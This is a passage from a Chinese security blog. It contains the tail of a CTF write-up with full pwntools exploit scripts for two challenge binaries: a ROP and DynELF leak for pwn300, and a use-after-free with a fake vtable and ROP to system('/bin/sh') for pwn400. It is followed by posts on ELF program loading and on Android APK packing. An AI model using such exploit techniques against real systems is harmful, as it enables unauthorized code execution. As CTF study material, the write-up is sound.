class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os, sys</span><br><span class="line"></span><br><span class="line"><span class="comment"># switches</span></span><br><span class="line">DEBUG = <span class="number">0</span></span><br><span class="line">LOCAL = <span class="number">1</span></span><br><span class="line">VERBOSE = <span class="number">0</span></span><br><span class="line"><span class="comment"># modify this</span></span><br><span class="line"><span class="keyword">if</span> LOCAL:</span><br><span class="line">    r = process(<span class="string">&#x27;./pwn300&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    r = remote(<span class="string">&#x27;127.0.0.1&#x27;</span>, <span class="number">4444</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> VERBOSE: context(log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment"># define symbols and offsets here</span></span><br><span class="line">main_addr = <span class="number">0x4004a9</span></span><br><span class="line">pop_r12_r13_r14_r15 = <span class="number">0x40049e</span></span><br><span class="line">callframe = <span class="number">0x400484</span></span><br><span class="line">write_got = <span class="number">0x601018</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">recvall</span>(<span class="params">count</span>):</span></span><br><span class="line">    buf = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">while</span> count:</span><br><span class="line">        tmp = r.recvn(count)</span><br><span class="line">        buf += tmp</span><br><span class="line">        count -= <span class="built_in">len</span>(tmp)</span><br><span class="line">    <span class="keyword">return</span> buf</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span>(<span class="params">addr, length = <span class="number">40</span></span>):</span></span><br><span class="line">    r.recvuntil(<span class="string">&#x27;fuck me!\n&#x27;</span>)</span><br><span class="line">    payload = <span class="string">&#x27;A&#x27;</span> * <span class="number">40</span></span><br><span class="line">    payload += p64(pop_r12_r13_r14_r15) <span class="comment"># 通用gadget</span></span><br><span class="line">    payload += p64(write_got)</span><br><span class="line">    payload += p64(length)</span><br><span class="line">    payload += p64(addr)</span><br><span class="line">    payload += p64(<span class="number">1</span>)</span><br><span class="line">    payload += p64(callframe)</span><br><span class="line">    payload += p64(<span class="number">0</span>) * <span class="number">7</span></span><br><span class="line">    payload += p64(main_addr)</span><br><span class="line">    <span class="keyword">assert</span> <span class="built_in">len</span>(payload) &lt;= <span class="number">0xa0</span></span><br><span class="line">    r.send(payload.ljust(<span class="number">0xa0</span>))</span><br><span class="line">    <span class="keyword">return</span> recvall(length)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> DEBUG: gdb.attach(r)</span><br><span class="line">dynelf = DynELF(leak, elf = ELF(<span class="string">&#x27;pwn300&#x27;</span>))</span><br><span class="line">libgetshell = dynelf.lookup(<span class="literal">None</span>, <span class="string">&quot;libgetshell&quot;</span>) <span class="comment"># 泄露库函数地址</span></span><br><span class="line">getshell = libgetshell + <span class="number">0x311</span> <span class="comment"># 根据dump出的库，找到getshell函数的偏移</span></span><br><span class="line"><span class="comment"># getshell = dynelf.lookup(&#x27;getshell&#x27;, &#x27;libgetshell&#x27;) # 这种方法会出错，不知道什么原因</span></span><br><span class="line"></span><br><span class="line">info(<span class="string">&quot;libgetshell = &quot;</span> + <span class="built_in">hex</span>(libgetshell))</span><br><span class="line">info(<span class="string">&quot;getshell = &quot;</span> + <span class="built_in">hex</span>(getshell))</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&#x27;fuck me!\n&#x27;</span>)</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span> * <span class="number">40</span> + p64(getshell)</span><br><span class="line">r.send(payload.ljust(<span class="number">0xa0</span>))</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string"># dump库</span></span><br><span class="line"><span class="string">f = open(&#x27;libgetshell.dump&#x27;, &#x27;wb&#x27;)</span></span><br><span class="line"><span class="string">while 1:</span></span><br><span class="line"><span class="string">    f.write(leak(libgetshell, 0x1000))</span></span><br><span class="line"><span class="string">    libgetshell += 0x1000</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="pwn400"><a href="#pwn400" class="headerlink" title="pwn400"></a>pwn400</h2><p>这是一个C++写的rsa加解密程序，里面有一个<code>qword_604380</code>的全局变量，命名为cipher，首先要分析出cipher的结构，因为整个程序都在操作这个结构。  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">cipher:</span><br><span class="line">| 0x8    | 0x48      | 0x200          | 0x8      | 0x8</span><br><span class="line">+--------+-----------+----------------+----------+--------+</span><br><span class="line">| vtable | plaintext | cipertext      | keychain | length |</span><br><span class="line">+--------+-----------+----------------+----------+--------+</span><br></pre></td></tr></table></figure>
<p>刚开始的时候我也不知道其实cipher是一个类，不知道第一个存储空间是vtable，只知道第一个存储空间里存的是一些函数地址。<br>加密的时候，加密一个字节会变为8个字节，加密0x40个字节，ciphertext就是0x200，打印的时候就会将keychain的地址一同打印出来。<br><img src="/images/lctfpwn/pwn400.png"><br>解密之后会有uaf：解密之后cipher变量所指的堆会被free，但是cipher指针没有置空，再调用comment会覆盖原来的堆，根据前面泄露的堆地址，覆盖vtable为fake_vtable（一个堆上的地址），在这个地址上写上要执行的gadget的地址。<br>这里找的是如下一段gadget：  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x0000000000401245 : add rsp, 0x28 ; pop rbx ; pop rbp ; ret</span><br></pre></td></tr></table></figure>
<p><img src="/images/lctfpwn/pwn400-2.png"><br>gadget执行完之后，栈顶即为局部变量textbuf，因此可以在这里布置ropchain，方法是调用  </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">DEBUG = <span class="number">0</span></span><br><span class="line">LOCAL = <span class="number">0</span></span><br><span class="line">VERBOSE = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.23.so&#x27;</span>)</span><br><span class="line">system_offset = libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">binsh_offset = <span class="built_in">next</span>(libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>))</span><br><span class="line">printf_offset = libc.symbols[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line"></span><br><span class="line">pop_rdi = <span class="number">0x402343</span></span><br><span class="line">printf_got = <span class="number">0x604018</span></span><br><span class="line">printf_plt = <span class="number">0x400be0</span></span><br><span class="line">main = <span class="number">0x401d9d</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> LOCAL:</span><br><span class="line">    r = process(<span class="string">&#x27;./pwn400&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    r = remote(<span class="string">&#x27;127.0.0.1&#x27;</span>, <span class="number">4444</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> VERBOSE: context(log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">menu</span>():</span></span><br><span class="line">    <span class="keyword">return</span> r.recvuntil(<span class="string">&#x27;exit\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">addcipher</span>(<span class="params">keychain=<span class="string">&#x27;0&#x27;</span>, p = <span class="number">3</span>, q = <span class="number">5</span></span>):</span></span><br><span class="line">    menu()</span><br><span class="line">    r.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">&#x27;No\n&#x27;</span>)</span><br><span class="line">    r.sendline(keychain)</span><br><span class="line">    <span class="keyword">if</span> keychain == <span class="string">&#x27;1&#x27;</span>:</span><br><span class="line">        r.recvuntil(<span class="string">&#x27;p:&#x27;</span>)</span><br><span class="line">        r.sendline(<span class="built_in">str</span>(p))</span><br><span class="line">        r.recvuntil(<span class="string">&#x27;q:&#x27;</span>)</span><br><span class="line">        r.sendline(<span class="built_in">str</span>(q))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span>(<span class="params">length, data</span>):</span></span><br><span class="line">    menu()</span><br><span class="line">    r.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">&#x27;)\n&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(length))</span><br><span class="line">    r.recvuntil(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    r.send(data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span>(<span class="params">length, data</span>):</span></span><br><span class="line">    menu()</span><br><span class="line">    r.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">&#x27;)\n&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(length))</span><br><span class="line">    r.recvuntil(<span class="string">&#x27;text\n&#x27;</span>)</span><br><span class="line">    r.send(data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">comment</span>(<span class="params">data</span>):</span></span><br><span class="line">    menu()</span><br><span class="line">    r.sendline(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">&#x27;RSA&#x27;</span>)</span><br><span class="line">    r.send(data)</span><br><span class="line"></span><br><span class="line"><span class="comment"># define exploit function here</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn</span>():</span></span><br><span class="line">    <span class="keyword">if</span> DEBUG: gdb.attach(r)</span><br><span class="line">    addcipher(keychain=<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;press enter to encrypt&quot;</span></span><br><span class="line">    raw_input()</span><br><span class="line">    encrypt(<span class="number">64</span>, <span class="string">&#x27;a&#x27;</span>*<span class="number">64</span>)</span><br><span class="line">    r.recvuntil(<span class="string">&#x27;: &#x27;</span>)</span><br><span class="line">    r.recvn(<span class="number">512</span>) <span class="comment"># encrypt text length</span></span><br><span class="line">    heapleak = u64(r.recvuntil(<span class="string">&#x27;\n&#x27;</span>)[:<span class="number">-1</span>].ljust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">    heap = heapleak - <span class="number">0x270</span></span><br><span class="line">    info(<span class="string">&quot;Heap Leak = &quot;</span> + <span class="built_in">hex</span>(heap))</span><br><span class="line">    decrypt(<span class="number">64</span>, <span class="string">&#x27;0&#x27;</span> * <span class="number">128</span>) <span class="comment"># uaf</span></span><br><span class="line">    fake_vtable = heap + <span class="number">0x40</span></span><br><span class="line">    payload = p64(fake_vtable) + p64(<span class="number">1</span>) * <span class="number">5</span> + p64(<span class="number">0xdeadbeef</span>) * <span class="number">4</span> + p64(<span class="number">0x401245</span>) + p64(<span class="number">0x401245</span>) <span class="comment"># 这个gadget是覆盖的decrypt函数</span></span><br><span class="line">    payload = payload.ljust(<span class="number">128</span>)</span><br><span class="line">    comment(payload)</span><br><span class="line">    ropchain = p64(pop_rdi)</span><br><span class="line">    ropchain += p64(printf_got)</span><br><span class="line">    ropchain += p64(printf_plt)</span><br><span class="line">    ropchain += p64(main)</span><br><span class="line">    decrypt(<span class="number">256</span>, ropchain.ljust(<span class="number">512</span>)) <span class="comment"># 这里会先将ropchain写到栈上，然后调用decrypt，但decrypt已经变为gadget的地址</span></span><br><span class="line">    libc = u64(r.recvn(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>)) - printf_offset <span class="comment"># leak libc base addr</span></span><br><span class="line">    info(<span class="string">&#x27;libc = &#x27;</span> + <span class="built_in">hex</span>(libc))</span><br><span class="line">    ropchain = p64(pop_rdi)</span><br><span class="line">    ropchain += p64(libc + binsh_offset)</span><br><span class="line">    ropchain += p64(libc + system_offset)</span><br><span class="line">    decrypt(<span class="number">256</span>, ropchain.ljust(<span class="number">512</span>))</span><br><span class="line">    r.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    pwn()</span><br></pre></td></tr></table></figure>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans">
    <link itemprop="mainEntityOfPage" href="http://example.com/2016/10/10/ELF-Executable-and-Linking-Format-part2/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.jpg">
      <meta itemprop="name" content="Bruce Fan">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="BruceFan's Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2016/10/10/ELF-Executable-and-Linking-Format-part2/" class="post-title-link" itemprop="url">ELF: Executable and Linking Format part2</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建于：2016-10-10 09:39:59" itemprop="dateCreated datePublished" datetime="2016-10-10T09:39:59+08:00">2016-10-10</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="更新于：2020-11-12 10:26:14" itemprop="dateModified" datetime="2020-11-12T10:26:14+08:00">2020-11-12</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="PROGRAM-LOADING"><a href="#PROGRAM-LOADING" class="headerlink" title="PROGRAM LOADING"></a>PROGRAM LOADING</h2><h3 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h3><p>这一篇介绍了目标文件信息和系统运行程序所需的动作。<br>可执行目标文件和共享目标文件都是静态的表示程序。为了执行这样的程序，系统使用这些文件来创建动态的程序表示，即<code>进程映像</code>。一个进程映像通过segment保存文本、数据、堆栈等。</p>
<h3 id="Program-Header"><a href="#Program-Header" class="headerlink" title="Program Header"></a>Program Header</h3><p>可执行目标文件和共享目标文件的<code>程序头部表（program header table）</code>是一个结构体数组，每个元素描述了一个segment，以及系统准备执行程序时所需的其他信息。目标文件的segment包含一个或多个section，后面会介绍。Program Header只对可执行目标文件和共享目标文件有意义。  </p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Program Header</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    Elf32_Word p_type;</span><br><span class="line">    Elf32_Off  p_offset;</span><br><span class="line">    Elf32_Addr p_vaddr;</span><br><span class="line">    Elf32_Addr p_paddr;</span><br><span class="line">    Elf32_Word p_filesz;</span><br><span class="line">    Elf32_Word p_memsz;</span><br><span class="line">    Elf32_Word p_flags;</span><br><span class="line">    Elf32_Word p_align;</span><br><span class="line">&#125; Elf32_Phdr;</span><br></pre></td></tr></table></figure>
<p><code>p_type</code> 说明了这个数组元素描述了一个什么种类的segment，以及如何解释这个数组元素的信息。Type取值和含义后面介绍。<br><code>p_offset</code> 从文件开头到segment第一个字节的偏移。<br><code>p_vaddr</code> segment第一个字节在内存中的虚拟地址。<br><code>p_paddr</code> 某些系统上此成员保存segment的物理地址。由于System V忽略应用程序的物理地址，这个成员的取值在可执行目标文件和共享目标文件中没有定义。<br><code>p_filesz</code> segment在文件映像中的字节数，可能为0。<br><code>p_memsz</code> segment在内存映像中的字节数，可能为0。<br><code>p_flags</code> 与segment相关的标志。后面介绍。<br><code>p_align</code> 后面”程序加载”一节会介绍，可加载的进程segment其p_vaddr和p_offset必须是模页大小同余的。这个成员给出了segment在内存和文件中的对齐值。<br>有的表项描述了进程segment，其他的则描述了一些进程映像中并不包含的辅助信息。segment表项除了有明确规定的，可以采用任意的顺序。下面列出了segment类型的取值，其他的取值留作以后使用。<br><strong>Segment Types</strong>，p_type</p>
<table>
<thead>
<tr>
<th align="left">Name</th>
<th align="right">Value</th>
</tr>
</thead>
<tbody><tr>
<td align="left">PT_NULL</td>
<td align="right">0</td>
</tr>
<tr>
<td align="left">PT_LOAD</td>
<td align="right">1</td>
</tr>
<tr>
<td align="left">PT_DYNAMIC</td>
<td align="right">2</td>
</tr>
<tr>
<td align="left">PT_INTERP</td>
<td align="right">3</td>
</tr>
<tr>
<td align="left">PT_NOTE</td>
<td align="right">4</td>
</tr>
<tr>
<td align="left">PT_SHLIB</td>
<td align="right">5</td>
</tr>
<tr>
<td align="left">PT_PHDR</td>
<td align="right">6</td>
</tr>
<tr>
<td align="left">PT_LOPROC</td>
<td align="right">0X70000000</td>
</tr>
<tr>
<td align="left">PT_HIPROC</td>
<td align="right">0X7FFFFFFF</td>
</tr>
</tbody></table>
<p><code>PT_NULL</code> 表示此数组元素未被使用，其他成员的值未定义。这个类型使程序头部表可以包含一些无关的表项。<br><code>PT_LOAD</code> 表示这是一个可加载的segment，通过p_filesz和p_memsz描述。目标文件中的字节将被映射到内存segment的开始部分去。如果segment的内存大小（p_memsz）大于文件大小（p_filesz），在segment已初始化数据区后面多出来的部分将填充值为0的字节。文件大小可以小于内存大小。程序头部表中可加载的segment表项依据p_vaddr成员按升序排列。<br><code>PT_DYNAMIC</code> 保存了动态链接的相关信息。参见后面”动态section”一节。<br><code>PT_INTERP</code> 指定了一个以空字节结尾的字符串的位置和长度，这个字符串是需调用的解释器的路径。<br><code>PT_NOTE</code> 指定了辅助信息的位置和大小。<br><code>PT_SHLIB</code> 保留的，未定义语义。<br><code>PT_PHDR</code> 如果有，指定了文件和内存映像中程序头部表的位置和大小。<br><code>PT_LOPROC</code>至<code>PT_HIPROC</code>此范围内的取值留作处理器相关的语义。</p>
<blockquote>
<p>注：除非在其他地方有特殊的需求，所有程序头部的segment类型都是可选的，即文件的程序头部表可能只包含与其内容有关的程序头部。</p>
</blockquote>
<h4 id="Base-Address"><a href="#Base-Address" class="headerlink" title="Base Address"></a>Base Address</h4><p>可执行目标文件和共享目标文件有一个基地址，这个地址是程序目标文件的内存映像的起始虚拟地址。基地址的一个作用是在动态链接时重定位程序的内存映像。<br>一个可执行目标文件或共享目标文件的基地址是在执行期间由三个值计算出来的：<code>内存加载地址</code>、<code>最大页尺寸</code>、<code>程序的可加载segment的起始虚拟地址</code>。程序头部中的虚拟地址可能并不代表程序内存映像中实际的虚拟地址。为了计算基地址,需要首先确定与<code>PT_LOAD</code>类型segment<code>p_vaddr</code>对应的内存地址，然后截去地址的低位部分，使地址为最接近的最大页大小的整数倍的地址，这就是基地址。依据加载进内存的文件的类型，内存地址可能与<code>p_vaddr</code>的值匹配，也可能不匹配。<br>part1中介绍的.bss section是<code>SHT_NOBITS</code>型的，虽然它不占据文件空间，但对segment在内存中的映像还是有影响的。通常，这些未初始化的数据驻留在segment的尾部，因此，使得程序头部中的<code>p_memsz</code>比<code>p_filesz</code>大。</p>
<h4 id="note-section"><a href="#note-section" class="headerlink" title="note section"></a>note section</h4><p>有时厂商或系统构建者需要用特定的信息注释目标文件,程序利用这些 信息进行一致性和兼容性等检查。<code>SHT_NOTE</code>类型的section和<code>PT_NOTE</code>类型的程序头部就是用于这个目的。</p>
<h3 id="Program-Loading"><a href="#Program-Loading" class="headerlink" title="Program Loading"></a>Program Loading</h3><p>系统创建或增补一个进程映像时，只是逻辑上的拷贝文件中的segment到虚拟内存中的segment。系统何时、是否在物理上访问这个文件，取决于程序的执行行为，比如系统加载等。执行进程的过程中，只有引用到逻辑页时才会请求一个物理页。进程中通常会有很多未引用的页，这种延迟物理读的方式就将这些未引用的页排除了，提高了系统的性能。在实际应用中，如果想实现这种方式，就必须使可执行目标文件和共享目标文件的segment映像在文件中的偏移及其虚拟地址是模页大小同余的。<br><strong>Executable File</strong><br><img src="/images/elfpart2/exe.png"><br><strong>Program Header Segments</strong></p>
<table>
<thead>
<tr>
<th align="left">Member</th>
<th align="right">Text</th>
<th align="right">Data</th>
</tr>
</thead>
<tbody><tr>
<td align="left">p_type</td>
<td align="right">PT_LOAD</td>
<td align="right">PT_LOAD</td>
</tr>
<tr>
<td align="left">p_offset</td>
<td align="right">0x100</td>
<td align="right">0x2bf00</td>
</tr>
<tr>
<td align="left">p_vaddr</td>
<td align="right">0x08048100</td>
<td align="right">0x08074f00</td>
</tr>
<tr>
<td align="left">p_paddr</td>
<td align="right">unspecified</td>
<td align="right">unspecified</td>
</tr>
<tr>
<td align="left">p_filesz</td>
<td align="right">0x2be00</td>
<td align="right">0x4e00</td>
</tr>
<tr>
<td align="left">p_memsz</td>
<td align="right">0x2be00</td>
<td align="right">0x5e24</td>
</tr>
<tr>
<td align="left">p_flags</td>
<td align="right">PF_R+PF_X</td>
<td align="right">PF_R+PF_W+PF_X</td>
</tr>
<tr>
<td align="left">p_align</td>
<td align="right">0x1000</td>
<td align="right">0x1000</td>
</tr>
</tbody></table>
<p>例子中，.text段和.data段的文件偏移、虚拟地址都是模4KB同余的，但是有四个页面（依据页面大小和系统文件块大小）包含的不全是文本或数据。</p>
<ul>
<li>第一个文本页包含ELF头部，程序头部表和其他信息。</li>
<li>最后一个text页包含一份.data段开始部分的拷贝。</li>
<li>第一个data页包含一份.data段结尾部分的拷贝。</li>
<li>最后一个data页可能包含与进程运行不相关的文件信息。</li>
</ul>
<p>逻辑上，系统使每个段看起来都好像是完整和独立的，以便为它们所在的内存赋予访问权限。这就需要调整段的地址，以确保地址空间中的每个逻辑页有一组独立的权限。在上面的例子中，文件中保存文本结尾和数据开头的区域将被映射两次，一个虚拟地址对应文本，另一个不同的虚拟地址对应数据。<br>.data段的结尾处需要为未初始化的数据做特殊的处理，系统将这部分数据的值置为0。如果文件的最后一个data页包含其他信息，这些信息不会映射到逻辑内存页中，必须将内存页剩余部分的数据置为 0，这一点与可执行文件允许有未知的内容不同。系统是否需 要除去其他三个页面中的不纯信息(Impurities)未作规定。这个程序对应的内存映像如下图所示，假设页面大小是4KB(0x1000)。<br><strong>Process Image Segment</strong><br><img src="/images/elfpart2/process_image.png"><br>可执行目标文件和共享目标文件加载 segment 时有所不同，通常可执行目标文件的segment包含的是绝对代码。为了使进程正确执行，segment必须驻留在可执行目标文件中指定的虚拟地址。 因此，系统不会改变<code>p_vaddr</code>的值，直接将它作为虚拟地址。<br>而共享目标文件的segment包含的是位置无关代码，这就意味着，虽然其虚拟地址在不同进程间是不同的，但却不会导致执行行为无效。尽管系统为每个进程单独选择虚拟地址，它仍然维护这些segment的相对位置。由于位置无关代码在segment中使用相对地址，内存虚拟地址间的偏移必须与文件中的虚拟地址的偏移保持一致。下图举了不同进程中共享目标虚拟地址分配的一个例子，展示了相对位置的不变性，也展示了如何计算基地址。<br><strong>Example Shared Object Segment Address</strong><br><img src="/images/elfpart2/shared_object.png"></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans">
    <link itemprop="mainEntityOfPage" href="http://example.com/2016/08/29/Android%E4%B8%AD%E7%9A%84Apk%E5%8A%A0%E5%9B%BA%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90%E5%92%8C%E5%AE%9E%E7%8E%B0/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.jpg">
      <meta itemprop="name" content="Bruce Fan">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="BruceFan's Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2016/08/29/Android%E4%B8%AD%E7%9A%84Apk%E5%8A%A0%E5%9B%BA%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90%E5%92%8C%E5%AE%9E%E7%8E%B0/" class="post-title-link" itemprop="url">Android中的Apk加固原理解析和实现</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建于：2016-08-29 21:19:28" itemprop="dateCreated datePublished" datetime="2016-08-29T21:19:28+08:00">2016-08-29</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="更新于：2020-11-12 10:26:14" itemprop="dateModified" datetime="2020-11-12T10:26:14+08:00">2020-11-12</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="原理解析"><a href="#原理解析" class="headerlink" title="原理解析"></a>原理解析</h2><p>下面看一下Android中加壳的原理：<br><img src="/images/packedapk/yuanli.png"><br>在加固过程中需要三个对象：</p>
<ul>
<li>需要加密的APK（源程序APK）</li>
<li>壳程序APK（负责解密APK工作）</li>
<li>加密工具（将源APK进行加密和壳程序的DEX合并）</li>
</ul>
<p><strong>主要步骤</strong><br>用加密算法对源程序APK进行加密，再将其与壳程序APK的DEX文件合并生成新的DEX文件，最后替换壳程序中的原DEX文件即可。得到新的APK也叫做脱壳程序APK，它已经不是一个完整意义上的APK程序了，它的主要工作是：负责解密源程序APK，然后加载APK，让其正常运行起来。<br>在这个过程中需要了解的知识是：<strong>如何将源程序APK和壳程序APK进行合并</strong><br>这需要了解DEX文件的格式，下面简单介绍一下：</p>
<table>
<thead>
<tr>
<th align="center">address</th>
<th align="center">name</th>
<th align="center">size/byte</th>
<th align="center">value</th>
</tr>
</thead>
<tbody><tr>
<td align="center">0</td>
<td align="center">magic[8]</td>
<td align="center">8</td>
<td align="center">0x6465 780a 3033 3500</td>
</tr>
<tr>
<td align="center">8</td>
<td align="center">checksum</td>
<td align="center">4</td>
<td align="center">0xc136 5e17</td>
</tr>
<tr>
<td align="center">c</td>
<td align="center">signature[20]</td>
<td align="center">20</td>
<td align="center"></td>
</tr>
<tr>
<td align="center">20</td>
<td align="center">file_size</td>
<td align="center">4</td>
